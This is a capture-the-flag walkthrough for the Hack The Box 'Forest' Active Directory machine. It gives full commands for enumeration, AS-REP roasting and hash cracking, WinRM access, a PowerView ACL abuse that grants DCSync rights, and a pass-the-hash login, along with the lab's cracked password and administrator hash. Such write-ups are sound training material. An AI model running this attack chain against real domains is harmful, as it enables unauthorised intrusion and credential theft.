---
title: Forest
draft: false
tags:
---

![[Forest.png]]

Machine: https://app.hackthebox.com/machines/212

---
# Enumeration(No creds)
## Port Scanning
- Getting open ports as well as service and version running on this ports
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.10.161
```
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sVC -n -Pn --min-rate 5000 10.10.10.161 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250311232329.png]]

Domain Name: `htb.local`
Host Name: `FOREST`
SMB guest account support

## LDAP
- Lets try to get all available information
```bash
ldapsearch -H ldap://10.10.10.161 -x -s base
```
>[!example]- Result
>![[Pasted image 20250311232909.png]]
```bash
ldapsearch -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local'
```
>[!example]- Result
>![[Pasted image 20250311233056.png]]
>This message make me sense about a [forest structure](https://academy.hackthebox.com/module/74/section/700)

>[!warning] Looks like we can use [[ldapdomaindump]] because we can't enumerate all DNs as anonymous
>

- Getting just account name that are part of the group: 'domain users' 
```bash
ldapsearch -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local' "(&(objectCategory=person)(objectClass=user)(primaryGroupID=513))" sAMAccountName | grep -i 'samaccountname'
```
>[!example]- Result
>![[Pasted image 20250312003958.png]]

## Enum4Linux
- In order to get more info we can use [[enum4linux]] 
```bash
enum4linux -a 10.10.10.161 -w htb.local -A
```
>[!example]- Result
>![[Pasted image 20250312013125.png]]
>![[Pasted image 20250312013202.png]]
>![[Pasted image 20250312013349.png]]


Domain Sid: `S-1-5-21-3072663084-364016917-1341370565`
New User found: `svc-alfresco`
There are 2 Domains: `htb.local | buildin.local`

## Kerberos
- Checking if any user have the flag 'UF_DONT_REQUIRE_PREAUTH' using [[impacket-GetNPUsers]], And we have a TGT
```bash
impacket-GetNPUsers htb.local/ -usersfile usersList -request -dc-ip 10.10.10.161
```
>[!example]- Result
>![[Pasted image 20250312014340.png]]

# Exploitation
## Brute force
- now we can use [[hashcat]] in order to get the plan text password behind this TGT
```bash
hashcat -m 18200 TGTsvc-alfresco /usr/share/wordlists/rockyou.txt --force
```
>[!example]- Result
>![[Pasted image 20250312014849.png]]

Credentials:`svc-alfresco:s3rvice`

# Enumeration (Using Creds)
## LDAP
- Lets dump all information using [[ldapdomaindump]]
```bash
ldapdomaindump ldap://htb.local -u "htb.local\svc-alfresco" -p s3rvice
```
>[!example]- Result
>![[Pasted image 20250312154052.png]]

We have 2 computers: `EXCH01.htb.local | FOREST.htb.local`
# Getting Access
- We can use [[evil-winrm]] to get access (because we are in the "remote management group")

```bash
evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
```
>[!example]- Result
>![[Pasted image 20250312164819.png]]

# Privilege Escalation
- We cant use [[impacket-secretsdump]] because the user cant use RPC (port 49667) using this tools, (we don't have permisions)[^1]:
>[!example]- Result
>![[Pasted image 20250312231844.png]]
>![[Pasted image 20250312231846.png]]

- we can use [[bloodhaunt]] to get a better view
```powershell
.\SharpHound.exe -c ALL
```
>[!example]- Result
>![[Pasted image 20250313001403.png]]
>![[Pasted image 20250313111111.png]]

>[!warning] I recommed to use SharpHound.exe last version, becasuse [[bloodhaund-python]] didn't report me the correct path

- we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recommended way) or using [[PowerView]] (recommended way)
>[!warning] You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL

```powershell
. .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred
Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
```
>[!example]- Result
>![[Pasted image 20250313111316.png]]


- Now we can do the next step "WriteDacl", keep in mind that the current session has the old permission (not the new permission with `EXCHANGE WINDOWS PERMISSIONS`), so we need to create a new credentials(PScredentials), `TargetIdentity` can be `DC=htb,DC=local` or `htb.local\Domain Admins`, "Referring Objects"[^2]
```powershell
$SecPassword2 = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword2)
Add-DomainObjectAcl -Credential $Cred2 -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
```
>[!cite]- One-Liner
>```pwsh
>. .\PowerView.ps1; $Cred=New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',(ConvertTo-SecureString 's3rvice' -AsPlainText -Force)); Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco' -Credential $Cred;  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync
>```

- now we can use [[impacket-secretsdump]] to dump hashes and [[psexec.py]] to get access
```bash
psexec.py FOREST.htb.local/administrator@10.10.10.161 -hashes ':32693b11e6aa90eb43d32c72a07ceea6'
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```
>[!example]- Result
>![[Pasted image 20250313121110.png]]
>![[Pasted image 20250313121045.png]]

# Note
- You have to do this process as fast as u can because there are a task that clean up all permision since 60s
```bash
schtasks /query /fo table
schtasks /query /tn restore /v /fo list
type C:\Users\Administrator\Documents\revert.ps1
```
>[!example]- Result
>![[Pasted image 20250313121553.png]]
>![[Pasted image 20250313122420.png]]
>![[Pasted image 20250313122528.png]]

---
# Definitions

[^1]: The Program use this ports: ![[Pasted image 20250313125256.png]]

[^2]: In **Active Directory**, when referring to a **group or user**, the system can usually resolve the name using a more friendly notation (like `'htb.local\Domain Admins'`) without needing to specify the full Distinguished Name, as you would with `'DC=htb,DC=local'`. However, for the **domain itself** or **higher-level objects** (like the root of the domain), you must reference it using the full **Distinguished Name**, since `'htb.local'` alone is not sufficient to correctly identify the root domain.